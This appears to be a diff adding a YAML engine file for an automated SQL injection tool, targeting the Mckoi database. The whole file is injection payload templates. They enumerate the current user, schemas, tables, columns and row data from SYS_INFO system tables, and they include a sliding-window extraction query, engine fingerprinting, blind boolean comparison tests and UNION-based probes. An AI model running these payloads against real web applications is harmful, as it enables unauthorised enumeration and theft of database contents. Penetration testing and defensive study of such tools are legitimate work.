@@ -1,0 +1,145 @@
+engine: Mckoi
+
+resource:
+ info: |
+  select
+      '-'
+      || '${enclose_value_sql}'
+      || '-'
+      || '${enclose_value_sql}'
+      || user()
+      || '${trail_sql}'
+      r
+
+ schema:
+  database: |
+   select
+       rr
+       || '${trail_sql} '
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || t.s
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select name s from SYS_INFO.sUSRSchemaInfo) t,
+           (select name s from SYS_INFO.sUSRSchemaInfo) t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   ) a
+
+  table: |
+   select
+       rr
+       || '${trail_sql} '
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || t.s
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${database}') t,
+           (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${database}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   ) a
+
+  column: |
+   select
+       rr
+       || '${trail_sql} '
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || t.s
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = '${database}' and "table" = '${table}') t,
+           (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = '${database}' and "table" = '${table}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   ) a
+
+  row:
+   query: |
+    select
+        rr
+        || '${trail_sql} '
+        r
+    from (
+        select
+            '${enclose_value_sql}'
+            || t.s
+            || '${separator_qte_sql}0${enclose_value_sql}'
+            rr
+        from
+            (select distinct ${fields} s from "${database}"."${table}") t,
+            (select distinct ${fields} s from "${database}"."${table}") t1
+        where t.s >= t1.s
+        group by t.s
+        ${limit}
+    ) a
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   '${lead}'
+   ||substring(
+       r,
+       ${window.char},
+       65536
+   ) rrr
+   from (
+       ${injection}
+   )
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select cast(x.rrr as char)rr from (select 1337${indice}7330%2b1 rrr)x
+  # No method repeat() found
+  calibrator: "'${calibrator_raw}'"
+  limitBoundary: 1
+  fingerprint:
+   errorMessage:
+    - mckoi
+   engineSpecific: if(${test},'a','b')=(select 'a' union select 'b' from SYS_INFO.sUSRSchemaInfo where 1=2)
+
+ binary:
+  test:
+   bin: |
+    true=( 
+        select substring(rrr,${window.char},1)%3E%3D'${mid}'
+        from(select ${injection})
+    )
+   truthyBin:
+    - "'a'%3E%3D'a'"
+    - "'a'%3E%3D'A'"
+    - "'a'%3E%3D'0'"
+    - "'b'%3E%3D'a'"
+    - "'b'%3E%3D'B'"
+    - "'1'%3E%3D'0'"
+   falsyBin:
+    - "'a'%3E%3D'b'"
+    - "'A'%3E%3D'a'"
+    - "'B'%3E%3D'b'"
+    - "'B'%3E%3D'a'"
+    - "'0'%3E%3D'A'"
+    - "'0'%3E%3D'1'"
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
+
+ union:
+  indices: union all select rr from (${indice_unique})b
+  capacity: "'${lead}${indice}' || ${calibrator}"
+  orderBy: order by 1337
